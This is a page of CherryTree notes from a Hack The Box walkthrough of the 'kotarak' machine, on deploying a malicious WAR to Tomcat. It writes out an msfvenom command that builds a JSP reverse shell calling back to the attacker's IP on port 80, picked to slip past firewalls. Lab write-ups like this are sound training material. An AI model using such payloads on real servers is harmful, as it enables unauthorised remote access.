<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>war upload</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="HacktheBox--Linux_Boxes--kotarak.html">kotarak</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap.html">nmap</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--all_ports.html">all ports</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports.html">targeted ports</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--8080.html">:8080</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--8009.html">:8009</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--60000.html">:60000</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page.html">kotarak web hosting page</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--mess_with_path.html">mess with path</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--burp.html">burp</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--localhost.html">localhost</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz.html">wfuzz</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost.html">wfuzz all ports of victim machine's localhost</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--22.html">:22</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--90.html">:90</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--110.html">:110</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--200.html">:200</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--320.html">:320</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888.html">:888</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=is.html">?doc=is </a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=backup_SSRF.html">?doc=backup SSRF</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=blah.html">?doc=blah</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--60000.html">:60000</a></li>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold.html">initial foothold</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login.html">Tomcat login</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login--war_upload.html">war upload</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login--reverse_shell.html">reverse shell</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--find_files_in_home_directory.html">find files in home directory</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--exfil_.bin_file.html">exfil .bin file</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket.html">impacket</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes.html">crack some ntlm hashes</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes--hashcat.html">hashcat</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes--crackstation_(online).html">crackstation (online)</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis.html">privesc to atanis</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis--user.txt.html">user.txt</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis--app.log.html">app.log</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--arp_-a.html">arp -a </a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc.html">priv esc</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget.html">out of date wget</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--set_up_nc_listener_on_port_80.html">set up nc listener on port 80</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit.html">exploit</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_1_prepare_malicious_.wgetrc_file_on_attack_machine.html">part 1: prepare malicious .wgetrc file on attack machine</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_2_set_up_ftp_server_on_port_21__(w-_authbind).html">part 2: set up ftp server on port 21  (w/ authbind)</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_3_exploit.py.html">part 3: exploit.py</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--root.html">root</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>war upload</u></b></h1><span style="color:#24ff00;">One crucial thing to remember about </span><span style="color:#ffff00;">t0mcat webservers</span><span style="color:#24ff00;"> is that they typically execute </span><span style="color:#ffa500;">.war </span><span style="color:#24ff00;">files and luckily, </span><span style="color:#ffa500;">msfvenom</span><span style="color:#24ff00;"> is capable of generating a </span><span style="color:#ffa500;">reverse shell</span><span style="color:#24ff00;"> written in </span><span style="color:#ffa500;">.war </span><span style="color:#24ff00;">easily for us, for reference check out </span><a href="https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/">this link</a><br /><img src="images/855-1.png" alt="images/855-1.png" /><br /><br /><span style="color:#24ff00;">another way to find the correct payload is to grep for </span><span style="color:#ffa500;">msfvenom's </span><span style="color:#ffff00;">reverse shell payloads</span><span style="color:#24ff00;"> </span><br /><span style="color:#ffa500;">msfvenom -l payloads | grep reverse</span><br /><span style="color:#24ff00;">where</span><span style="color:#ffa500;"> -l </span><span style="color:#24ff00;"> is list</span><br /><img src="images/855-2.png" alt="images/855-2.png" /><br /><img src="images/855-3.png" alt="images/855-3.png" /><br /><br /><br /><img src="images/855-4.png" alt="images/855-4.png" /><br /><span style="color:#ffa500;">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.62 LPORT=80 -f war &gt; shell.war</span><br /><span style="color:#24ff00;">where</span><br /><span style="color:#ffa500;">LHOST</span><span style="color:#24ff00;"> to our attacking machine's </span><span style="color:#ffa500;">local host</span><span style="color:#24ff00;"> IP<br /></span><span style="color:#ffa500;">LPORT</span><span style="color:#24ff00;"> to the </span><span style="color:#ffa500;">local port</span><span style="color:#24ff00;"> we want to have netcat listen on, we choose port </span><span style="color:#ffa500;">80</span><span style="color:#24ff00;"> here because it's most likely to make it through a firewall (</span><span style="color:#ffa500;">53</span><span style="color:#24ff00;"> is also a good choice)<br /></span><span style="color:#ffa500;">-p </span><span style="color:#24ff00;">is for payload </span><span style="color:#ffa500;">java/jsp_shell_reverse_tcp</span><span style="color:#24ff00;"> to send the reverse shell back<br /></span><span style="color:#ffa500;">-f </span><span style="color:#24ff00;">is for filetype </span><span style="color:#ffa500;">.war </span><span style="color:#24ff00;">because Tomcat servers run war files</span><br /><img src="images/855-5.png" alt="images/855-5.png" /><br /><br /><img src="images/855-6.png" alt="images/855-6.png" /><br /><img src="images/855-7.png" alt="images/855-7.png" /><br /><br /><br /></div></div>
</body></html>